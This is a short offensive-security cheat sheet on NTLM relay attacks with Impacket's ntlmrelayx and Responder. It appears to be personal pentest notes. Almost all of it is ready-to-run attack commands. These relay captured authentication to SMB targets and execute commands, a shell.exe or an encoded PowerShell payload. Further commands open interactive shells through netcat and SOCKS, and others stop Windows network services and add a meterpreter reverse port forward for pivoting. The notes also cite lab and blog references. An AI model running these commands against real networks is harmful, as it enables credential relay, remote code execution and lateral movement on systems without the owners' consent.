# Impacket

## 01 - NTLMRelayX

### 1.2 - Usage

TODO: Fill more info

```
$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c <commands>

$ sudo ntlmrelayx -tf targets.txt -smb2support -c <commands>

$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe

$ sudo ntlmrelayx -tf targets.txt -smb2support -e shell.exe
```

- Interactive shell with netcat

```
$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -socks

$ nc 127.0.0.1 <PORT>
```

### 1.3 - Use Cases

#### 1.3.1 - Callback Shell

- Modify in the Responder configuration file

`$ sudo nano /etc/responder/Responder.conf`

---

```
SMB=OFF
HTTP=OFF
```

- Start the Responder

`$ sudo responder -I <interface> -rdw`

Spawn callback shell

```
$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe

$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -c "powershell.exe -E <base64_encoded>"
```

Interactive shell with netcat

```
$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -i

$ nc 127.0.0.1 <PORT>
```

#### 1.3.2 - Proxychains via Relaying

##### 1.3.2.1 - Hijack Host and Setup MITM

- Disable SMB to spoof the targets via proxychains

```
$ sudo ntlmrelayx -t smb://<target_IP> -smb2support -socks

meterpreter > shell

C:\> sc stop netlogon

C:\> sc stop lanmanserver

C:\> sc config lanmanserver start=disabled

C:\> sc stop lanmanworkstation

C:\> sc config lanmanworkstation start=disabled

C:\> shutdown /r

C:\> exit
```

Add a reverse port forward to 445 to relay SMB attack via the command and control server (metasploit)

`meterpreter > portfwd add -R -L <bind_target_IP> -l 445 -p 445`

- Cleanup

```
meterpreter > shell

C:\> sc config lanmanserver start=auto

C:\> sc start lanmanworkstation

C:\> sc config lanmanworkstation start=auto

C:\> sc start netlogon
```

---
## References

- [AD Series: How to Perform Broadcast Attacks Using NTLMRelayx, MiTM6 and Responder](https://raxis.com/blog/ad-series-how-to-perform-broadcast-attacks/)

- [Tryhackme HOLO](https://stimpz0r.com/tryhackme-holo/)

- [How to Exploit Active Directory ACL Attack Paths Through LDAP Relaying Attacks](https://www.praetorian.com/blog/how-to-exploit-active-directory-acl-attack-paths-through-ldap-relaying-attacks/)

- [Rasta Mouse: NTLM Relaying via Cobalt Strike ](https://rastamouse.me/ntlm-relaying-via-cobalt-strike/)

- [Relaying NTLM to MSSQL](https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/)